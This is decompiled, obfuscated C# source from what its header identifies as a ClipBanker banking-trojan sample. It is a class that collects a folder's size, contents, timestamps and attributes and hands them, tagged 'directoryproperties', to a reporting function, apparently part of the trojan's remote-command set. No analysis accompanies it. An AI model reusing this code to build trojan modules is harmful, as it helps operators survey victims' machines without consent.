// Decompiled with JetBrains decompiler
// Type: TOm.4yy
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0032K4;
using crD;
using H16;
using I71;
using l6z;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace TOm
{
  internal sealed class \u0034yy : x77
  {
    private readonly string \u0034m5;
    private readonly int TK1;

    [SpecialName]
    public string Lo9() => this.\u0034m5;

    [SpecialName]
    public int \u00388X() => this.TK1;

    public \u0034yy(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3,
      [In] string obj4,
      [In] string obj5)
    {
      try
      {
        Dictionary<string, string> dictionary1 = obj1.dtU<Dictionary<string, string>>();
        Dictionary<string, Dictionary<string, string>> dictionary2 = new Dictionary<string, Dictionary<string, string>>()
        {
          {
            "General",
            new Dictionary<string, string>()
          }
        };
        if (Directory.Exists(dictionary1["Path"]))
        {
          DirectoryInfo directoryInfo = new DirectoryInfo(dictionary1["Path"]);
          try
          {
            dictionary2["General"]["Size"] = "~" + xY7.c36(this.\u00378a(directoryInfo));
            dictionary2["General"]["Location"] = directoryInfo.FullName;
            Dictionary<string, string> dictionary3 = dictionary2["General"];
            int num = ((IEnumerable<FileInfo>) directoryInfo.GetFiles()).Count<FileInfo>();
            string str1 = num.ToString();
            num = ((IEnumerable<DirectoryInfo>) directoryInfo.GetDirectories()).Count<DirectoryInfo>();
            string str2 = num.ToString();
            string str3 = str1 + " Files, " + str2 + " Folders";
            dictionary3["Contains"] = str3;
            Dictionary<string, string> dictionary4 = dictionary2["General"];
            DateTime dateTime1 = directoryInfo.CreationTime;
            dateTime1 = dateTime1.ToUniversalTime();
            string str4 = dateTime1.ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary4["Created"] = str4;
            Dictionary<string, string> dictionary5 = dictionary2["General"];
            dateTime1 = directoryInfo.LastWriteTime;
            dateTime1 = dateTime1.ToUniversalTime();
            string str5 = dateTime1.ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary5["Modified"] = str5;
            Dictionary<string, string> dictionary6 = dictionary2["General"];
            DateTime dateTime2 = directoryInfo.LastAccessTime;
            dateTime2 = dateTime2.ToUniversalTime();
            string str6 = dateTime2.ToString((IFormatProvider) CultureInfo.InvariantCulture);
            dictionary6["Accessed"] = str6;
            dictionary2["General"]["ReadOnly"] = directoryInfo.Attributes.HasFlag((Enum) FileAttributes.ReadOnly) ? "Y" : "N";
            dictionary2["General"]["Hidden"] = directoryInfo.Attributes.HasFlag((Enum) FileAttributes.Hidden) ? "Y" : "N";
            dictionary2["General"]["System"] = directoryInfo.Attributes.HasFlag((Enum) FileAttributes.System) ? "Y" : "N";
            dictionary2["General"]["Archive"] = directoryInfo.Attributes.HasFlag((Enum) FileAttributes.Archive) ? "Y" : "N";
          }
          catch
          {
          }
        }
        g79.F77(obj0, "directoryproperties", dictionary2.LE3(), obj2, obj3, obj4, obj5);
        this.TK1 = 0;
      }
      catch (Exception ex)
      {
        this.\u0034m5 = ex.Message;
        this.TK1 = 1;
      }
    }

    private long \u00378a([In] DirectoryInfo obj0)
    {
      long num = 0;
      try
      {
        foreach (FileInfo file in obj0.GetFiles())
          num += file.Length;
        DirectoryInfo[] directories = obj0.GetDirectories();
        if (directories.Length < 10)
        {
          foreach (DirectoryInfo directoryInfo in directories)
            num += this.\u00378a(directoryInfo);
        }
      }
      catch
      {
      }
      return num;
    }
  }
}
